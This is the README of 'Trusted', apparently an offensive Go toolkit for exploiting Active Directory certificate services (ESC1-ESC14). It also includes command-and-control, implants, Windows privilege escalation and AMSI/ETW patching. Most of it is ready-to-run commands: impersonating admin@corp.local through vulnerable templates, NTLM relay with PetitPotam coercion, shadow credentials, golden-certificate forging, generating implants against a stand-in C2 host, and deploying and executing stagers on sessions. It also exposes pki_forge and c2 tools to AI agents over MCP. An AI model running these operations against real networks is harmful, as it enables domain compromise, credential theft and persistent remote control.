# Trusted

ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Features

### ADCS / PKI Exploitation
- **ESC1-ESC14** complete vulnerability detection, scoring, and exploitation
- **Real certificate enrollment** via CA web endpoint (/certsrv/) — not just local forging
- **NTLM pass-the-hash** for both LDAP and HTTP enrollment (`--hash` flag)
- **ESC1** Misconfigured templates (enrollee supplies subject + auth EKU)
- **ESC2** Any Purpose EKU templates (enrollee supplies subject)
- **ESC3** Enrollment Agent templates (two-stage: agent cert → enroll on behalf)
- **ESC4** Vulnerable template ACLs — full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + auto-restore
- **ESC5** Vulnerable PKI object ACLs on CA
- **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 — SAN injection via CA enrollment service flags
- **ESC7** Vulnerable CA ACLs — ManageCA → enable ESC6 → enroll → auto-restore
- **ESC8** HTTP web enrollment relay detection + PetitPotam auto-coercion
- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION — UPN swap exploitation with auto-restore
- **ESC10** Weak certificate mapping detection (CertificateMappingMethods)
- **ESC11** RPC interface encryption enforcement detection
- **ESC12** DCOM interface abuse on CA with network HSM key storage
- **ESC13** OID group link abuse via msDS-OIDToGroupLink
- **ESC14** Weak explicit mappings via altSecurityIdentities
- **Golden certificate forging** — self-signed or sign with extracted CA key
- **Shadow Credentials** — msDS-KeyCredentialLink add/list/remove (key persisted before LDAP write)
- **Auto-pwn** — enumerate → prioritize → exploit → PKINIT commands in one shot
- **PetitPotam coercion** — MS-EFSRPC via stateful SMB2/DCE/RPC session
- **WebDAV coercion** — relay from non-admin pivot using custom port >1024

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management: registration, polling, command queue, result collection
- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
- **Polling agent**: cross-platform, mTLS support, signal-aware shutdown
- **File delivery**: upload and deploy binaries to agents with optional execution
- Agent command output capped at 10MB (OOM prevention)

### SmartPotato — Windows Privilege Escalation
- **JuicyPotato** — BITS COM object abuse + named pipe impersonation
- **SweetPotato** — PrintSpoofer via Print Spooler named pipe trigger
- **RoguePotato** — DCE/RPC OXID resolver redirect with auto netsh port proxy setup/cleanup
- AMSI/ETW patching (AmsiScanBuffer + EtwEventWrite)
- Auto-detect best technique based on running services

### Operational Tooling
- **Engagement reporting** — markdown format with severity tables, attack paths, remediation
- **JSON output** — `--json` flag for pipeline integration
- **PFX import/export** — load and inspect PKCS12 files
- **Stealth mode** — jittered LDAP queries, randomized page sizes
- **LDAPS/StartTLS** — encrypted LDAP connections via `--ldaps` / `--start-tls`
- **MCP server** — 5 tools for agentic integration (pki_enumerate, pki_forge, c2_*)
- **TUI operator console** — live C2 session polling, command dispatch, 5 views
- **Certificate theft playbook** — THEFT1-THEFT5 with certutil/mimikatz/SharpDPAPI commands

## Quick Start

```bash
# Build
CGO_ENABLED=0 go build -o trusted ./cmd/trusted

# Build SmartPotato for Windows
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

### Enumeration

```bash
# Basic enumeration
trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass

# With LDAPS
trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps

# With pass-the-hash (no plaintext password needed)
trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee

# JSON output
trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json

# Stealth mode (jittered queries)
trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
```

### Exploitation

```bash
# --esc accepts bare numbers (1-14) or esc1-esc14

# ESC1 — misconfigured template
trusted pki --esc 1 --template VulnTemplate --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# ESC4 — writable template ACLs (modifies template, exploits as ESC1, restores)
trusted pki --esc 4 --template WritableTemplate --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (SAN injection via request attributes)
trusted pki --esc 6 --template AnyTemplate --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# ESC7 — ManageCA abuse (enable ESC6 → exploit → restore)
trusted pki --esc 7 --ca CorpCA --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# ESC8 — NTLM relay with auto PetitPotam coercion
trusted pki --esc 8 --template Machine --target-dc dc01.corp.local \
  --domain corp.local -u user -p pass --listener-ip 10.0.0.5

# ESC8 — relay from non-admin pivot (WebDAV coercion to custom port)
trusted pki --esc 8 --template Machine --target-dc dc01.corp.local \
  --domain corp.local -u user -p pass --listener-ip 10.0.0.5 --listener-port 8080

# ESC9 — UPN swap (modifies attacker UPN, enrolls, restores)
trusted pki --esc 9 --template NoSecExt --upn admin@corp.local \
  --attacker-dn "CN=attacker,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# ESC13 — OID group link abuse
trusted pki --esc 13 --template LinkedPolicy --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass
```

### Auto-Pwn

```bash
# Full auto: enumerate → exploit highest-scoring path → PKINIT commands
trusted auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass

# Dry run: enumerate and plan only, don't exploit
trusted auto --dry-run --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
```

### Certificate Operations

```bash
# Forge golden certificate (with extracted CA key + cert)
trusted pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --output admin

# Forge self-signed cert (for testing)
trusted pki --forge --upn admin@corp.local --output test

# Import and inspect PFX
trusted pki --import-pfx cert.pfx
trusted pki --import-pfx cert.pfx --json

# Certificate theft playbook (--theft accepts 1-5 or all)
trusted pki --theft all
trusted pki --theft 4

# Generate engagement report
trusted pki --report --format markdown --output findings.md \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass
```

### Shadow Credentials

```bash
# Add shadow credential (private key saved to disk before LDAP write)
trusted shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# List shadow credentials
trusted shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Remove by device ID
trusted shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" \
  --device-id <guid> --target-dc dc01.corp.local --domain corp.local -u user -p pass
```

### C2

```bash
# Start HTTPS listener
trusted c2 --port 8443 --protocol https

# Generate stager config
trusted c2 --generate-stager --c2-url https://c2.example.com:8443 --output stager.json

# Generate cert-auth implant (mTLS)
trusted c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2.example.com:8443

# Run polling agent
trusted agent --config stager.json

# Deploy file to active session
trusted deploy --c2-url http://localhost:8443 --session <ID> \
  --file ./stager --path /tmp/svc --execute

# Operator console with live C2 data
trusted console --c2-url http://localhost:8080

# MCP server for agentic integration
trusted mcp
```

## Architecture

```
cmd/trusted/         CLI entry points (cobra)
  pki.go                PKI enumeration, exploitation, forging, reporting
  autopwn.go            Auto-pwn orchestration
  c2.go                 C2 listener, stager/implant generation
  agent.go              Polling agent
  deploy.go             File delivery to agents
  shadow.go             Shadow credentials CLI
  console.go            TUI operator console
  mcp_cmd.go            MCP stdio server
pkg/pki/
  adcs.go               LDAP enumeration, template scoring, ESC1/ESC4 exploits, cert forging
  enroll.go             Real certificate enrollment via CA web endpoint (/certsrv/)
  ntlm.go               NTLMv2 HTTP RoundTripper with pass-the-hash (inline MD4)
  coerce.go             PetitPotam MS-EFSRPC coercion (stateful SMB2/DCE/RPC)
  esc2.go - esc14.go    Individual ESC scan + exploit functions
  esc_relay.go          ESC8/ESC11/ESC12 relay scanning (HTTP probe, RPC flag check, DCOM probe)
  shadow_credentials.go msDS-KeyCredentialLink operations
  autopwn.go            Auto-pwn engine (enumerate → prioritize → exploit)
  report.go             Markdown engagement report generation
  chain.go              Attack path analysis and prioritization
  pkinit.go             PKINIT command/script generation
  unpac.go              UnPAC-the-hash command generation
  certtheft.go          THEFT1-THEFT5 playbook
  security_descriptor.go Binary SD/ACE/SID parsing for ESC4/ESC5
  output.go             EnumerationResult struct, EnumerateAll aggregator
  pfx.go                PFX import/export
pkg/c2/
  listener.go           HTTP/HTTPS C2 listener with session management
  agent.go              Polling agent with mTLS, file delivery, output limits
  deploy.go             File delivery endpoints
  certauth.go           Cert-auth implant generation
internal/mcp/
  server.go             MCP JSON-RPC stdio server (5 tools)
internal/tui/
  app.go                Bubbletea operator console with live C2 polling
implants/smartpotato/
  potato_windows.go     JuicyPotato, SweetPotato, RoguePotato (Windows)
  potato_other.go       Stub for non-Windows builds
```

## Dependencies

All pure Go, `CGO_ENABLED=0` compatible:

| Package | Purpose |
|---------|---------|
| `github.com/spf13/cobra` | CLI framework |
| `github.com/go-ldap/ldap/v3` | Native LDAP client |
| `github.com/charmbracelet/bubbletea` | TUI framework |
| `github.com/charmbracelet/lipgloss` | TUI styling |
| `software.sslmate.com/src/go-pkcs12` | PKCS12/PFX handling |

NTLM authentication uses a built-in NTLMv2 implementation with inline MD4 — no external crypto dependencies.
